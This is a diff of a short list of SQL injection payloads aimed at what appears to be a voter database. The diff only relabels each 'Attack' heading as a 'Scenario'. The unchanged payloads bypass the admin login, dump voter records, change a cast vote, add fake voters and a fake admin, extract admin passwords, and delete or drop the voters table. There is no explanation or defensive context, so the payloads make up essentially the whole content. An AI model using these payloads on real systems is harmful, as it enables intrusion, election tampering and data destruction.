@@ -1,25 +1,25 @@
-1. Attack: Admin Login Bypass
+Scenario 1: Admin Login Bypass
 Username: ' OR '1'='1
 Password: ' OR '1'='1
 
-2. Attack: Retrieve All Voter Data
+Scenario 2: Retrieve All Voter Data
 Input data: ' OR '1'='1
 
-3. Attack: Update a Voter's Vote
+Scenario 3: Update a Voter's Vote
 Input data: V105'; UPDATE voters SET vote_casted='Candidate C' WHERE voter_id='V105'; --
 
-4. Attack: Delete All Voter Records
+Scenario 4: Delete All Voter Records
 Input data: V105'; DELETE FROM voters; --
 
-5. Attack: Extract Admin Data
+Scenario 5: Extract Admin Data
 Input data: V105'; SELECT username, password FROM admins; --
 
-6. Attack: Add a Fake Voter
+Scenario 6: Add a Fake Voter
 Input data: V105'; INSERT INTO voters (name, voter_id, vote_casted) VALUES ('Hacker', 'V999', 'Candidate X'); --
 
-7. Attack: Create a New Admin
+Scenario 7: Create a New Admin
 Input data: V105'; INSERT INTO admins (username, password) VALUES ('hacker', 'hacked123'); --
 
-8. Attack: Drop the Voters Table
+Scenario 8: Drop the Voters Table
 Input data: V105'; DROP TABLE voters; --
 
